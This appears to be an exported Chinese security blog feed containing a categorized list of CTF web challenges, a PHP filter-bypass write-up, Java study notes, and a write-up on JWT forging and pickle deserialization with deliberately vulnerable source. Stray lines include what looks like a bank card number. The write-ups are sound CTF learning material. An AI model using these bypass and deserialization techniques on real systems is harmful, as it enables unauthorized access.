<h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><h3 id="简单-12"><a href="#简单-12" class="headerlink" title="简单"></a>简单</h3><h3 id="签到-11"><a href="#签到-11" class="headerlink" title="签到"></a>签到</h3><h3 id="中等-11"><a href="#中等-11" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[网鼎杯 2020 青龙组]filejava</li>
<li>[网鼎杯 2020 朱雀组]Think Java</li>
<li>[GKCTF 2021]babycat</li>
<li>[红明谷CTF 2021]JavaWeb 一年出现三次的题目</li>
<li>[GKCTF 2021]babycat-revenge</li>
<li>[WUSTCTF2020]Train Yourself To Be Godly tomcat题目CVE hackhat的tricks</li>
<li>[羊城杯 2020]A Piece Of Java java反序列化</li>
<li>[NPUCTF2020]EzShiro </li>
<li>[SCTF 2018]ZhuanXV</li>
</ul>
<h3 id="困难-11"><a href="#困难-11" class="headerlink" title="困难"></a>困难</h3><p>+ </p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="简单-13"><a href="#简单-13" class="headerlink" title="简单"></a>简单</h3><h3 id="签到-12"><a href="#签到-12" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[De1CTF 2019]SSRF Me Flask 字符串拼接带来的安全问题</li>
</ul>
<h3 id="中等-12"><a href="#中等-12" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[网鼎杯 2020 玄武组]SSRFMe 打主从redis</li>
<li>[SWPUCTF 2016]Web7</li>
<li>[GKCTF 2021]hackme</li>
</ul>
<h3 id="困难-12"><a href="#困难-12" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[虎符CTF 2021]Internal System</li>
<li>[CISCN2019 总决赛 Day1 Web2]Homebrew Dubbo</li>
</ul>
<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p>​	记录在这里的题目大部分比较简单且不是很好归为大类</p>
<ul>
<li>[极客大挑战 2019]Havefun 传参</li>
<li>[极客大挑战 2019]Http 各种头伪造</li>
<li>[ACTF2020 新生赛]BackupFile 文件泄露备份</li>
<li>[极客大挑战 2019]BuyFlag 弱类型比较、</li>
<li>[BJDCTF2020]Easy MD5 md5比较</li>
<li>[WUSTCTF2020]朴实无华 MD5绕过</li>
<li>[MRCTF2020]PYWebsite -wp 简单的伪造</li>
<li>[BSidesCF 2019]Kookie 简单题目</li>
<li>[b01lers2020]Welcome to Earth</li>
<li>[watevrCTF-2019]Cookie Store</li>
<li>[极客大挑战 2020]Roamphp1-Welcome</li>
<li>[RootersCTF2019]ImgXweb jwt伪造</li>
<li>[BSidesCF 2019]Pick Tac Toe</li>
<li>[BSidesCF 2020]Hurdles</li>
<li>virink_2019_files_share</li>
<li>[极客大挑战 2020]Roamphp4-Rceme</li>
</ul>
<h2 id="Tricks-x2F-CVE"><a href="#Tricks-x2F-CVE" class="headerlink" title="Tricks&#x2F;CVE"></a>Tricks&#x2F;CVE</h2><p>记录在这里的都是用tricks&#x2F;CVE出的题目</p>
<ul>
<li><p>[MRCTF2020]Ez_bypass</p>
</li>
<li><p>[GWCTF 2019]我有一个数据库 phpmyadmin4.8.0-4.8.1存在CVE</p>
</li>
<li><p>[ASIS 2019]Unicorn shop  unicorn 编码绕过</p>
</li>
<li><p>[BSidesCF 2019]Futurella misc跑到web来了、。</p>
</li>
<li><p>[MRCTF2020]套娃</p>
</li>
<li><p>[GWCTF 2019]枯燥的抽奖 伪随机数</p>
</li>
<li><p>[Zer0pts2020]Can you guess it? php5.3：basename()函数漏洞</p>
</li>
<li><p><strong>[网鼎杯 2020 白虎组]PicDown</strong>  &#x2F;proc&#x2F;self 下的文件很重要</p>
</li>
<li><p>[MRCTF2020]Ezaudit 伪随机数</p>
</li>
<li><p>[HarekazeCTF2019]Avatar Uploader 1 misc题目跑web里面了</p>
</li>
<li><p>[GKCTF 2021]easycms ezcms cve复现</p>
</li>
<li><p>[SUCTF 2018]annonymous</p>
</li>
<li><p>[BSidesCF 2019]Mixer ecb加密、</p>
</li>
<li><p>[NPUCTF2020]web🐕</p>
</li>
<li><p>easyweb tomcat cve复现</p>
</li>
<li><p>[BSidesCF 2020]Bulls23 流量分析，BUU好像挂了</p>
</li>
<li><p>[极客大挑战 2020]Cross  渗透题目，<strong>其实很有意思的一道题目</strong>【但是不知道为什么做的人很少</p>
</li>
<li><p>[HarekazeCTF2019]One Quadrillion tricks 文章：<a href="https://nkhrlab.hatenablog.com/entry/2019/05/19/224643">https://nkhrlab.hatenablog.com/entry/2019/05/19/224643</a></p>
</li>
</ul>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="中等-13"><a href="#中等-13" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[Windows]LFI2019</li>
</ul>
<h3 id="困难-13"><a href="#困难-13" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[HITCON 2019]Buggy_Net NET4.0 net题目，hitcon的题目感觉都挺难的【</li>
<li>[Windows][HITCON 2018]Why-So-Serials</li>
</ul>
<h2 id="WEBPWN"><a href="#WEBPWN" class="headerlink" title="WEBPWN"></a>WEBPWN</h2><p>webpwn放出来就不可能简单</p>
<h3 id="困难-14"><a href="#困难-14" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[De1CTF 2019]cloudmusic_rev</li>
<li>[CISCN2019 总决赛 Day1 Web1]滑稽云音乐 上面那道题是根据这道题改变的</li>
<li>[羊城杯 2020]Break The Wall webpwn？</li>
<li>2019 0CTF&#x2F;TCTF wallbreaker easy 恶意so文件上传</li>
</ul>
<h2 id="Break-x2F-Fix"><a href="#Break-x2F-Fix" class="headerlink" title="Break&#x2F;Fix"></a>Break&#x2F;Fix</h2><ul>
<li>[网鼎杯 2020 半决赛]AliceWebsite</li>
<li>[网鼎杯 2020 半决赛]BabyJS</li>
<li>[HFCTF 2021 Final]hatenum sql注入题目</li>
<li>[HCTF2018]final Web1 参考小西师傅的文章:<a href="https://moxiaoxi.info/ctf/2018/12/31/HCTFfinal/">https://moxiaoxi.info/ctf/2018/12/31/HCTFfinal/</a></li>
</ul>
<h2 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h2><h3 id="困难-15"><a href="#困难-15" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[RoarCTF 2019]Dist</li>
</ul>
<h2 id="未知难度"><a href="#未知难度" class="headerlink" title="未知难度"></a>未知难度</h2><ul>
<li><p>[CSCCTF 2019 Final]lofiai</p>
</li>
<li><p>[WMCTF2020]webcheckin 有好多checkin啊。。</p>
</li>
<li><p>[OGeek2019]Easy Real World 2</p>
</li>
<li><p>[INS’hAck 2019]Atchap、</p>
</li>
<li><p>[纵横杯1st 线下赛]upload</p>
</li>
<li><p>[NCTF2017]Be admin cbc反转攻击</p>
</li>
<li><p>Unkonwn Web 1</p>
</li>
<li><p>[SWPU2019]Web2 php-fpm的unix套接字来进行绕过openbase_dir和绕过disable_function</p>
</li>
<li><p>[N1CTF2020]Easy TP5</p>
</li>
<li><p>[N1CTF2020]Zabbix-fun </p>
</li>
<li><p>[BBCTF2020]note</p>
</li>
<li><p>NodeProxy</p>
</li>
<li><p>[SWPU2019]Web5</p>
</li>
<li><p>[OGeek2019]Enjoy Yourself</p>
</li>
<li><p>[CISCN2019 华东北赛区]Web6 </p>
</li>
<li><p>[MRCTF2020]Not So Web Application</p>
</li>
<li><p>[BBCTF2020]analytics</p>
</li>
<li><p>[Midnightsun CTF Quals 2019]Bigspin</p>
</li>
</ul>
<p>后面两页的题目几乎都没有WP了，我想很有可能就这么被淹没在时间长河中了。笔者统计至此有点疲倦了，故将不再一个个尝试搜索WP统计，姑且都当作未知难度的题目，原本是想截个图收工的，但是想到出题人的师傅们出题时候的心情，还是一个个的记录下来了，说不定以后自己也会去做做看呢 :)。</p>
<ul>
<li><p>[SUCTF 2018]HateIT</p>
</li>
<li><p>[Balsn2019]Images and Words</p>
</li>
<li><p>[BSidesCF 2019]MainFrame</p>
</li>
<li><p>[SCTF2018]BabySyc</p>
</li>
<li><p>TheMatrix </p>
</li>
<li><p>final Web2</p>
</li>
<li><p>[FBCTF2019]HR Module</p>
</li>
<li><p>[CSCCTF 2019 Final]ZlipperyStillAlive</p>
</li>
<li><p>[WMCTF2020]gogogo</p>
</li>
<li><p>[极客大挑战 2020]Roamphp5-FighterFightsInvincibly</p>
</li>
<li><p>[HCTF 2017]Deserted place</p>
</li>
<li><p>[StarCTF2019]EchoHub</p>
</li>
<li><p>[CISCN2019 华东南赛区]Web9</p>
</li>
<li><p>[XNUCA2019Qualifier]Blog Revenge</p>
</li>
<li><p>[watevrCTF-2019]HTJP</p>
</li>
<li><p>[WMCTF2020]easycoherence</p>
</li>
<li><p>[网鼎杯 2020 总决赛]Vulnfaces</p>
</li>
<li><p>[纵横杯1st 线下赛]easyphp</p>
</li>
<li><p>[34C3CTF 2017]urlstorage <strong>python</strong> <strong>XSS</strong> <strong>CSRF</strong></p>
</li>
</ul>
<p>7his_1s_my_fav0rite_ke7</p>
<p><strong>engine-1</strong></p>
<ul>
<li><p>SEAFARING xss</p>
</li>
<li><p>[SuperFish9 2019]XSS xss</p>
</li>
<li><p>[XNUCA2019Qualifier]Easy Crypto </p>
</li>
<li><p>[FBCTF2019]Secret Note keeper</p>
</li>
<li><p>[INS’hAck 2019]bypasses-everywhere</p>
</li>
<li><p>[INS’hAck 2019]bypasses-everywhere-2</p>
</li>
<li><p>[OGeek2019]Check In</p>
</li>
<li><p>[D3CTF 2019]BabyXSS</p>
</li>
<li><p>[N1CTF 2019]babyphoto</p>
</li>
<li><p>[Balsn2019]RCE auditor</p>
</li>
<li><p>[watevrCTF-2019]NewPwd</p>
</li>
<li><p>[BSidesCF 2019]FlagSrv</p>
</li>
<li><p>[WMCTF2020]CFGO</p>
</li>
<li><p>[极客大挑战 2020]Roamphp6-flagshop 这道题目应该是环境出了问题</p>
</li>
</ul>
<p>至此，BUU上所有的WEB的题目笔者已经粗略的进行了分类，希望能在以后的时间里对各位小师傅们的学习起到帮助</p>
<p>6217000120029826930</p>
<p>tar xvzf mod_python-2.7.11.tgz</p>
<p> cd mod_python-2.7.11;</p>
<p> .&#x2F;configure –with-apxs&#x3D;&#x2F;usr&#x2F;bin&#x2F;apxs –with-python&#x3D;&#x2F;usr&#x2F;bin</p>
<p>.&#x2F;configure –with-python&#x3D;&#x2F;path&#x2F;to&#x2F;python</p>
<p> make</p>
<p> sudo make install</p>
]]></content>
  </entry>
  <entry>
    <title>kalmarc.tf</title>
    <url>/2023/03/11/kalmarc-tf/</url>
    <content><![CDATA[<p>1.打开源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure>

<p>$_SERVER[“QUERY_STRING”]  获取的是?后面的值</p>
<p>第一个绕过<br>$$<br>substr_count() 函数计算子串在字符串中出现的次数。<br>$$<br>_的url编码是%5f,可以换成%5F绕过</p>
<p>第二个绕过</p>
<p>^以及$的意思是以23333开头结尾，所以内容必须是23333，可以在后面加一个回车的url编码，%0a</p>
<p><img src="/2023/03/11/kalmarc-tf/x.jpg" alt="题图"></p>
<p>进入secrettw.php；</p>
<p><img src="/2023/03/11/kalmarc-tf/j.jpg" alt="题图"></p>
<p>发现x-forwarded-for没有效果</p>
<p>打开源代码</p>
<p>发现是jsfuck</p>
<p>解码后发现是post一个”post me Merak”</p>
<p>上传直接上传Merak没反应，加个等号才能出现代码</p>
<p><img src="/2023/03/11/kalmarc-tf/1.jpg" alt="题图"></p>
<p>出现部分代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现最后会输出file_get_contents(change($_GET[‘file’]))</p>
<p>又发现包含了flag.php,可以用file_get_contents()读flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents() 把文件读入一个字符串</span><br></pre></td></tr></table></figure>







]]></content>
  </entry>
  <entry>
    <title>phar反序列化[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
    <url>/2023/03/08/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox/</url>
    <content><![CDATA[<p>1.上传文件之后可以下载，可以修改文件名&#x2F;..&#x2F;..&#x2F;来下载文件</p>
<p>index.php,class.php</p>
<p>2.存在file_get_contents(),考虑phar反序列化</p>
<ol start="3">
<li></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>java学习笔记</title>
    <url>/2023/04/12/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>1.定义了返回类型必须有返回值</p>
<p>2.多维数组</p>
<p>3.问题在于history都need have person go perform</p>
<p>4.稀疏数组</p>
<p>1.面向对象</p>
<p>类{内容，new，this}</p>
<p>类中包括属性（变量.）和方法</p>
<p>JAVA 文件中只能含有一个 Public 类，每个public类只有一个主函数，主函数可以定义一个对象来new类，分配内存并且初始化，alt+insert</p>
<p>构造可选是否产生构造器。</p>
<p>{super,extends,}</p>
<p>super不适用于静态方法</p>
<p>如果父类和子类具有相同的字段，则使用<code>super</code>来指定为父类数据成员或字段</p>
<p>getname setname</p>
<h1 id="？？？protect"><a href="#？？？protect" class="headerlink" title="？？？protect"></a>？？？protect</h1><h3 id="多态："><a href="#多态：" class="headerlink" title="多态："></a>多态：</h3><p>两个非静态方法，new时基于声明类型；</p>
<p>非静态方法继承情况下，Java的实例方法调用是基于运行时的调用的实际类型</p>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        A a=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a.test();</span><br><span class="line"></span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        b.test();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;123B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;123A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">123A</span><br><span class="line">123A</span><br></pre></td></tr></table></figure>

<p>更换为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">A a=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a.test();</span><br><span class="line"></span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">        b.test();</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123A</span><br><span class="line">123B</span><br></pre></td></tr></table></figure>

<p>更换为static：结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123A</span><br><span class="line">123B</span><br></pre></td></tr></table></figure>

<p>关于一个实例的分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Income[] incomes = <span class="keyword">new</span> <span class="title class_">Income</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Income</span>(<span class="number">3000</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Salary</span>(<span class="number">7500</span>),<span class="comment">//可以直接调用类名传参</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">StateCouncilSpecialAllowance</span>(<span class="number">15000</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(totalTax(incomes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">totalTax</span><span class="params">(Income... incomes)</span> &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">total</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Income income: incomes) &#123;</span><br><span class="line">            total = total + income.getTax();</span><br><span class="line">        &#125;<span class="comment">///new Salary(7500).getTax()</span></span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Income</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">double</span> income;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Income</span><span class="params">(<span class="type">double</span> income)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.income = income;</span><br><span class="line">    &#125;<span class="comment">//构造函数</span></span><br><span class="line">a.Income(<span class="number">1.2223</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getTax</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.1</span>; <span class="comment">// 税率10%</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Salary</span> <span class="keyword">extends</span> <span class="title class_">Income</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Salary</span><span class="params">(<span class="type">double</span> income)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getTax</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (income &lt;= <span class="number">5000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (income - <span class="number">5000</span>) * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StateCouncilSpecialAllowance</span> <span class="keyword">extends</span> <span class="title class_">Income</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StateCouncilSpecialAllowance</span><span class="params">(<span class="type">double</span> income)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getTax</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果一个父类不允许子类对它的某个方法进行覆写，可以把该方法标记为<code>final</code></p>
<p>一个类不允许继承，标记为final</p>
<p>抽象类：</p>
<p>接口：</p>
<p>扩展接口:</p>
<p>static静态方法无需实例化对象</p>
<p>对<code>Method</code>实例调用<code>invoke</code>就相当于调用该方法，invoke第一个参数为对象实例，在哪个实例上调用方法就使用这个参数，所以调用静态方法时invoke第一个参数为null</p>
<p>无继承关系的数据类型无法赋值：</p>
<p>java中除了基本类型int等，其他都是class型号，返回java.lang.xxx</p>
<p>main方法无法访问其他类的private变量</p>
<p>对method实例调用invoke相当于调用此方法</p>
<p>实例的本质是对象</p>
<p>abstract类是没有花括号的类，不能被实例化</p>
<p>321</p>
<p>Dynamic Proxy</p>
<p>在Java编程语言中，interface实例是指一个实现了某个接口的类的对象。接口是定义在类外的，不可以实例化</p>
<p>可以定义抽象方法，是可以没有方法内容的</p>
<p>类经过实例化才能调用非静态方法，</p>
<h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a><strong>泛型</strong></h3><p>使用泛型可以直接给一个类定义类型，不经过显式的强制转换</p>
<p>通配符T，E，K，V</p>
<p>?和T区别是？是一个不确定类，？和T都表示不确定的类型 ，但如果是T的话，函数里面可以对T进行操作，比方 T car &#x3D; getCar()，而不能用？ car &#x3D; getCar()。</p>
<p>只能有一个public类，可以有多个public方法</p>
]]></content>
  </entry>
  <entry>
    <title>做题笔记</title>
    <url>/2023/03/23/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-2/</url>
    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>pickle反序列化，</p>
<p>1.先找到lv6</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    a=<span class="string">&#x27;只因你太美&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;http://72f111c1-fadc-403e-8a0e-4e6bda14e7c0.node4.buuoj.cn:81/shop?page=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    x=requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(x.status_code)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> x.text:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/23/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-2/1.jpg" alt="题图"></p>
<p>可以修改cookie中的折扣</p>
<p>抓包</p>
<p>发现jwt加密</p>
<p>jwt-cracker爆破密码是1Kun，伪造jwt</p>
<p><img src="/2023/03/23/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-2/12.jpg" alt="题图"></p>
<p>进来提示备份，查看源码</p>
<p><img src="/2023/03/23/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-2/13.jpg" alt="题图"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>post方法中，先对获得的become变量进行url解码，再进行反序列化</p>
<p>所以可以直接写一个序列化的脚本</p>
